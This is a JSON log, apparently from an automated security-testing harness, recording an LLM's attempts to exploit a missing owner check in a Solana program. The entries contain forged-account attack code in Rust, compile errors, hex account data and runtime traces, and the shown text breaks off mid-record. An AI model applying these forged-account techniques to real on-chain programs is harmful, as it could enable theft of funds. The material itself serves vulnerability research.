@@ -1,0 +1,224 @@
+{
+  "category": "OWNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "UnknownError(ExternalAccountDataModified)",
+  "reason": "o ataque parou com UnknownError(ExternalAccountDataModified), erro do runtime da Solana e nao do programa: o programa aceitou a entrada e tentou uma operacao que nenhum programa pode fazer (ex.: gravar em conta cujo dono e outro programa). Demonstre o dano por outra via, por exemplo uma decisao do programa tomada a partir dos dados da conta forjada, gravada numa conta que pertence a ele.",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2427,
+        "completion_tokens": 785,
+        "latency_s": 4.58
+      },
+      "raw": "{\n  \"plan\": \"O atacante cria uma conta forjada cujo owner e o System Program (nao o programa-alvo), com dados de 56 bytes onde os campos supply (offset 40) e balance (offset 48) sao controlados pelo atacante. O baseline usa a instrucao burn legitimamente sobre uma conta cujo owner e o program_id, provando que o cenario esta montado corretamente. O ataque chama burn com a mesma quantidade, mas passando a conta forjada como accounts[0], cujo owner difere do baseline. O efeito mede que os bytes 40..56 da conta forjada foram alterados pela instrucao, demonstrando que o programa aceitou e gravou em uma conta que nao lhe pertence.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta legitima: owner = program_id, com supply=1000, balance=500 nos offsets 40 e 48\\nlet mut legit_data = vec![0u8; 56];\\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet legit_account = account(&program_id, &legit_data, None);\\n\\n// Conta forjada: owner = System Program (diferente do program_id), dados controlados pelo atacante\\nlet mut forged_data = vec![0u8; 56];\\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 100;\\nlet ix_data = [IX_BURN, amount.to_le_bytes().as_ref()].concat();\\n\\n// Baseline: burn legitimo sobre a conta com owner correto\\nlet ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account_key, false)]);\\nlet contas_baseline = vec![(legit_account_key, legit_account.clone())];\\nlet r_base = env.baseline(\\\"burn legitimo sobre conta do programa\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: burn sobre a conta forjada (owner diferente)\\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account_key, false)]);\\nlet contas_attack = vec![(forged_account_key, forged_account.clone())];\\nlet r = env.attack(\\\"burn sobre conta forjada com owner diferente\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &forged_account_key).data();\\n    let new_supply = read_u64(after_data, 40);\\n    let new_balance = read_u64(after_data, 48);\\n    env.effect(\\\"supply da conta forjada foi decrementado pela instrucao\\\", new_supply == 900);\\n    env.effect(\\\"balance da conta forjada foi decrementado pela instrucao\\\", new_balance == 400);\\n}\"\n}",
+      "plan": "O atacante cria uma conta forjada cujo owner e o System Program (nao o programa-alvo), com dados de 56 bytes onde os campos supply (offset 40) e balance (offset 48) sao controlados pelo atacante. O baseline usa a instrucao burn legitimamente sobre uma conta cujo owner e o program_id, provando que o cenario esta montado corretamente. O ataque chama burn com a mesma quantidade, mas passando a conta forjada como accounts[0], cujo owner difere do baseline. O efeito mede que os bytes 40..56 da conta forjada foram alterados pela instrucao, demonstrando que o programa aceitou e gravou em uma conta que nao lhe pertence.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta legitima: owner = program_id, com supply=1000, balance=500 nos offsets 40 e 48\nlet mut legit_data = vec![0u8; 56];\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet legit_account = account(&program_id, &legit_data, None);\n\n// Conta forjada: owner = System Program (diferente do program_id), dados controlados pelo atacante\nlet mut forged_data = vec![0u8; 56];\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 100;\nlet ix_data = [IX_BURN, amount.to_le_bytes().as_ref()].concat();\n\n// Baseline: burn legitimo sobre a conta com owner correto\nlet ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account_key, false)]);\nlet contas_baseline = vec![(legit_account_key, legit_account.clone())];\nlet r_base = env.baseline(\"burn legitimo sobre conta do programa\", &ix_baseline, &contas_baseline);\n\n// Ataque: burn sobre a conta forjada (owner diferente)\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account_key, false)]);\nlet contas_attack = vec![(forged_account_key, forged_account.clone())];\nlet r = env.attack(\"burn sobre conta forjada com owner diferente\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &forged_account_key).data();\n    let new_supply = read_u64(after_data, 40);\n    let new_balance = read_u64(after_data, 48);\n    env.effect(\"supply da conta forjada foi decrementado pela instrucao\", new_supply == 900);\n    env.effect(\"balance da conta forjada foi decrementado pela instrucao\", new_balance == 400);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:24:20\n   |\n24 |     let ix_data = [IX_BURN, amount.to_le_bytes().as_ref()].concat();\n   |                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `legit_account_key` in this scope\n  --> tests/attempt.rs:27:63\n   |\n27 | ...data, &[AccountMeta::new(legit_account_key, false)]);\n   |                             ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n27 -     let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account_key, false)]);\n27 +     let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account, false)]);\n   |\n\nerror[E0425]: cannot find value `legit_account_key` in this scope\n  --> tests/attempt.rs:28:33\n   |\n28 |     let contas_baseline = vec![(legit_account_key, legit_account.clone...\n   |                                 ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -     let contas_baseline = vec![(legit_account_key, legit_account.clone())];\n28 +     let contas_baseline = vec![(legit_account, legit_account.clone())];\n   |\n\nerror[E0425]: cannot find value `forged_account_key` in this scope\n  --> tests/attempt.rs:32:61\n   |\n32 | ...ata, &[AccountMeta::new(forged_account_key, false)]);\n   |                            ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n32 -     let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account_key, false)]);\n32 +     let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account, false)]);",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:24:20\n   |\n24 |     let ix_data = [IX_BURN, amount.to_le_bytes().as_ref()].concat();\n   |                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `legit_account_key` in this scope\n  --> tests/attempt.rs:27:63\n   |\n27 | ...data, &[AccountMeta::new(legit_account_key, false)]);\n   |                             ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n27 -     let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account_key, false)]);\n27 +     let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account, false)]);\n   |\n\nerror[E0425]: cannot find value `legit_account_key` in this scope\n  --> tests/attempt.rs:28:33\n   |\n28 |     let contas_baseline = vec![(legit_account_key, legit_account.clone...\n   |                                 ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -     let contas_baseline = vec![(legit_account_key, legit_account.clone())];\n28 +     let contas_baseline = vec![(legit_account, legit_account.clone())];\n   |\n\nerror[E0425]: cannot find value `forged_account_key` in this scope\n  --> tests/attempt.rs:32:61\n   |\n32 | ...ata, &[AccountMeta::new(forged_account_key, false)]);\n   |                            ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n32 -     let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account_key, false)]);\n32 +     let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account, false)]);"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3496,
+        "completion_tokens": 717,
+        "latency_s": 3.49
+      },
+      "raw": "{\n  \"plan\": \"Preparo duas contas com 56 bytes: uma legitima com owner = program_id (supply=1000, balance=500) e uma forjada com owner = System Program e os mesmos valores. O baseline executa burn(100) sobre a conta legitima, provando que o cenario esta correto. O ataque executa a mesma instrucao burn(100) sobre a conta forjada, cujo owner difere do programa. Se o ataque tiver sucesso, os offsets 40..48 e 48..56 da conta forjada serao decrementados para 900 e 400, demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_key = Pubkey::new_unique();\\nlet forged_key = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 56];\\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet legit_account = account(&program_id, &legit_data, None);\\n\\nlet mut forged_data = vec![0u8; 56];\\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 100;\\nlet mut ix_data = Vec::new();\\nix_data.push(3u8);\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_key, false)]);\\nlet contas_baseline = vec![(legit_key, legit_account.clone())];\\nlet _r_base = env.baseline(\\\"burn legitimo sobre conta do programa\\\", &ix_baseline, &contas_baseline);\\n\\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_key, false)]);\\nlet contas_attack = vec![(forged_key, forged_account.clone())];\\nlet r = env.attack(\\\"burn sobre conta forjada com owner diferente\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &forged_key).data();\\n    let new_supply = read_u64(after_data, 40);\\n    let new_balance = read_u64(after_data, 48);\\n    env.effect(\\\"supply da conta forjada foi decrementado pela instrucao\\\", new_supply == 900);\\n    env.effect(\\\"balance da conta forjada foi decrementado pela instrucao\\\", new_balance == 400);\\n}\"\n}",
+      "plan": "Preparo duas contas com 56 bytes: uma legitima com owner = program_id (supply=1000, balance=500) e uma forjada com owner = System Program e os mesmos valores. O baseline executa burn(100) sobre a conta legitima, provando que o cenario esta correto. O ataque executa a mesma instrucao burn(100) sobre a conta forjada, cujo owner difere do programa. Se o ataque tiver sucesso, os offsets 40..48 e 48..56 da conta forjada serao decrementados para 900 e 400, demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_key = Pubkey::new_unique();\nlet forged_key = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 56];\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet legit_account = account(&program_id, &legit_data, None);\n\nlet mut forged_data = vec![0u8; 56];\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 100;\nlet mut ix_data = Vec::new();\nix_data.push(3u8);\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_key, false)]);\nlet contas_baseline = vec![(legit_key, legit_account.clone())];\nlet _r_base = env.baseline(\"burn legitimo sobre conta do programa\", &ix_baseline, &contas_baseline);\n\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_key, false)]);\nlet contas_attack = vec![(forged_key, forged_account.clone())];\nlet r = env.attack(\"burn sobre conta forjada com owner diferente\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &forged_key).data();\n    let new_supply = read_u64(after_data, 40);\n    let new_balance = read_u64(after_data, 48);\n    env.effect(\"supply da conta forjada foi decrementado pela instrucao\", new_supply == 900);\n    env.effect(\"balance da conta forjada foi decrementado pela instrucao\", new_balance == 400);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:29:44\n    |\n 29 | ... env.raw_ix(&ix_data, &[AccountMeta::new(legit_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:33:42\n    |\n 33 | ... env.raw_ix(&ix_data, &[AccountMeta::new(forged_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:29:44\n    |\n 29 | ... env.raw_ix(&ix_data, &[AccountMeta::new(legit_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:33:42\n    |\n 33 | ... env.raw_ix(&ix_data, &[AccountMeta::new(forged_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3290,
+        "completion_tokens": 748,
+        "latency_s": 3.73
+      },
+      "raw": "{\n  \"plan\": \"Preparo duas contas com o mesmo layout de 56 bytes: uma legitima com owner = program_id e uma forjada com owner = System Program, ambas com supply=1000 e balance=500 nos offsets 40 e 48. O baseline executa burn(100) sobre a conta legitima, provando que o cenario esta correto. O ataque executa a mesma instrucao burn(100) sobre a conta forjada, cujo owner nao e o programa. Se o ataque tiver sucesso, a instrucao tera gravado supply=900 e balance=400 na conta forjada, demonstrando que aceitou e modificou uma conta de dono arbitrario.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_key = Pubkey::new_unique();\\nlet forged_key = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 56];\\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet legit_account = account(&program_id, &legit_data, None);\\n\\nlet mut forged_data = vec![0u8; 56];\\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 100;\\nlet mut ix_data = Vec::new();\\nix_data.push(3u8);\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas_baseline: Vec<AccountMeta> = vec![AccountMeta::new(legit_key, false)];\\nlet ix_baseline = env.raw_ix(&ix_data, metas_baseline);\\nlet contas_baseline = vec![(legit_key, legit_account.clone())];\\nlet _r_base = env.baseline(\\\"burn legitimo sobre conta do programa\\\", &ix_baseline, &contas_baseline);\\n\\nlet metas_attack: Vec<AccountMeta> = vec![AccountMeta::new(forged_key, false)];\\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\\nlet contas_attack = vec![(forged_key, forged_account.clone())];\\nlet r = env.attack(\\\"burn sobre conta forjada com owner diferente\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &forged_key).data();\\n    let new_supply = read_u64(after_data, 40);\\n    let new_balance = read_u64(after_data, 48);\\n    env.effect(\\\"supply da conta forjada foi decrementado pela instrucao\\\", new_supply == 900);\\n    env.effect(\\\"balance da conta forjada foi decrementado pela instrucao\\\", new_balance == 400);\\n}\"\n}",
+      "plan": "Preparo duas contas com o mesmo layout de 56 bytes: uma legitima com owner = program_id e uma forjada com owner = System Program, ambas com supply=1000 e balance=500 nos offsets 40 e 48. O baseline executa burn(100) sobre a conta legitima, provando que o cenario esta correto. O ataque executa a mesma instrucao burn(100) sobre a conta forjada, cujo owner nao e o programa. Se o ataque tiver sucesso, a instrucao tera gravado supply=900 e balance=400 na conta forjada, demonstrando que aceitou e modificou uma conta de dono arbitrario.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_key = Pubkey::new_unique();\nlet forged_key = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 56];\nlegit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet legit_account = account(&program_id, &legit_data, None);\n\nlet mut forged_data = vec![0u8; 56];\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 100;\nlet mut ix_data = Vec::new();\nix_data.push(3u8);\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas_baseline: Vec<AccountMeta> = vec![AccountMeta::new(legit_key, false)];\nlet ix_baseline = env.raw_ix(&ix_data, metas_baseline);\nlet contas_baseline = vec![(legit_key, legit_account.clone())];\nlet _r_base = env.baseline(\"burn legitimo sobre conta do programa\", &ix_baseline, &contas_baseline);\n\nlet metas_attack: Vec<AccountMeta> = vec![AccountMeta::new(forged_key, false)];\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\nlet contas_attack = vec![(forged_key, forged_account.clone())];\nlet r = env.attack(\"burn sobre conta forjada com owner diferente\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &forged_key).data();\n    let new_supply = read_u64(after_data, 40);\n    let new_balance = read_u64(after_data, 48);\n    env.effect(\"supply da conta forjada foi decrementado pela instrucao\", new_supply == 900);\n    env.effect(\"balance da conta forjada foi decrementado pela instrucao\", new_balance == 400);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "burn legitimo sobre conta do programa",
+            "result": "Success",
+            "compute_units": 227,
+            "account_flags": "-w",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000084030000000000009001000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn sobre conta forjada com owner diferente",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 109,
+            "account_flags": "-w",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000e803000000000000f401000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 227 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 109 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque parou com UnknownError(ExternalAccountDataModified), erro do runtime da Solana e nao do programa: o programa aceitou a entrada e tentou uma operacao que nenhum programa pode fazer (ex.: gravar em conta cujo dono e outro programa). Demonstre o dano por outra via, por exemplo uma decisao do programa tomada a partir dos dados da conta forjada, gravada numa conta que pertence a ele."
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3093,
+        "completion_tokens": 906,
+        "latency_s": 4.77
+      },
+      "raw": "{\"plan\": \"O ataque anterior falhou porque o runtime da Solana impede que um programa grave em conta de outro dono (ExternalAccountDataModified). A hipotese OWNER, porem, e que o programa aceita uma conta forjada sem verificar o owner. Para demonstrar o dano sem violar a regra de gravacao, uso uma conta forjada (owner = System Program) cujos bytes 40..56 sao controlados pelo atacante, e uma segunda conta 'ledger' pertencente ao programa que sera gravada. O baseline usa a conta legitima do programa como ledger. No ataque, a conta forjada e passada como accounts[0] (ledger) e a conta do programa como accounts[1]; o programa le supply/balance da conta forjada e grava os novos valores na conta do programa, provando que aceitou dados de uma conta com owner arbitrario.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet forged_key = Pubkey::new_unique();\\nlet real_key = Pubkey::new_unique();\\n\\n// Conta forjada: owner = System Program, dados controlados pelo atacante\\nlet mut forged_data = vec![0u8; 56];\\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\n// Conta real do programa, que sera gravada\\nlet mut real_data = vec![0u8; 56];\\nreal_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nreal_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet real_account = account(&program_id, &real_data, None);\\n\\nlet amount: u64 = 100;\\nlet mut ix_data = Vec::new();\\nix_data.push(3u8);\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: ledger legitimo (owner = programa)\\nlet metas_baseline: Vec<AccountMeta> = vec![AccountMeta::new(real_key, false)];\\nlet ix_baseline = env.raw_ix(&ix_data, metas_baseline);\\nlet contas_baseline = vec![(real_key, real_account.clone())];\\nlet _r_base = env.baseline(\\\"burn legitimo sobre conta do programa\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: accounts[0] e a conta forjada (owner = System Program), accounts[1] e a conta real do programa\\nlet metas_attack: Vec<AccountMeta> = vec![\\n    AccountMeta::new(forged_key, false),\\n    AccountMeta::new(real_key, false),\\n];\\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\\nlet contas_attack = vec![\\n    (forged_key, forged_account.clone()),\\n    (real_key, real_account.clone()),\\n];\\nlet r = env.attack(\\\"burn com ledger forjado (owner != programa)\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_real = after(&r, &real_key).data();\\n    let new_supply = read_u64(after_real, 40);\\n    let new_balance = read_u64(after_real, 48);\\n    env.effect(\\\"programa gravou supply decrementado na conta real a partir de dados da conta forjada\\\", new_supply == 900);\\n    env.effect(\\\"programa gravou balance decrementado na conta real a partir de dados da conta forjada\\\", new_balance == 400);\\n}\"}",
+      "plan": "O ataque anterior falhou porque o runtime da Solana impede que um programa grave em conta de outro dono (ExternalAccountDataModified). A hipotese OWNER, porem, e que o programa aceita uma conta forjada sem verificar o owner. Para demonstrar o dano sem violar a regra de gravacao, uso uma conta forjada (owner = System Program) cujos bytes 40..56 sao controlados pelo atacante, e uma segunda conta 'ledger' pertencente ao programa que sera gravada. O baseline usa a conta legitima do programa como ledger. No ataque, a conta forjada e passada como accounts[0] (ledger) e a conta do programa como accounts[1]; o programa le supply/balance da conta forjada e grava os novos valores na conta do programa, provando que aceitou dados de uma conta com owner arbitrario.",
+      "scenario": "let program_id = env.program_id;\n\nlet forged_key = Pubkey::new_unique();\nlet real_key = Pubkey::new_unique();\n\n// Conta forjada: owner = System Program, dados controlados pelo atacante\nlet mut forged_data = vec![0u8; 56];\nforged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);\n\n// Conta real do programa, que sera gravada\nlet mut real_data = vec![0u8; 56];\nreal_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nreal_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet real_account = account(&program_id, &real_data, None);\n\nlet amount: u64 = 100;\nlet mut ix_data = Vec::new();\nix_data.push(3u8);\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: ledger legitimo (owner = programa)\nlet metas_baseline: Vec<AccountMeta> = vec![AccountMeta::new(real_key, false)];\nlet ix_baseline = env.raw_ix(&ix_data, metas_baseline);\nlet contas_baseline = vec![(real_key, real_account.clone())];\nlet _r_base = env.baseline(\"burn legitimo sobre conta do programa\", &ix_baseline, &contas_baseline);\n\n// Ataque: accounts[0] e a conta forjada (owner = System Program), accounts[1] e a conta real do programa\nlet metas_attack: Vec<AccountMeta> = vec![\n    AccountMeta::new(forged_key, false),\n    AccountMeta::new(real_key, false),\n];\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\nlet contas_attack = vec![\n    (forged_key, forged_account.clone()),\n    (real_key, real_account.clone()),\n];\nlet r = env.attack(\"burn com ledger forjado (owner != programa)\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let after_real = after(&r, &real_key).data();\n    let new_supply = read_u64(after_real, 40);\n    let new_balance = read_u64(after_real, 48);\n    env.effect(\"programa gravou supply decrementado na conta real a partir de dados da conta forjada\", new_supply == 900);\n    env.effect(\"programa gravou balance decrementado na conta real a partir de dados da conta forjada\", new_balance == 400);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "burn legitimo sobre conta do programa",
+            "result": "Success",
+            "compute_units": 227,
+            "account_flags": "-w",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000084030000000000009001000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn com ledger forjado (owner != programa)",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 156,
+            "account_flags": "-w,-w",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000e803000000000000f401000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000e803000000000000f401000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
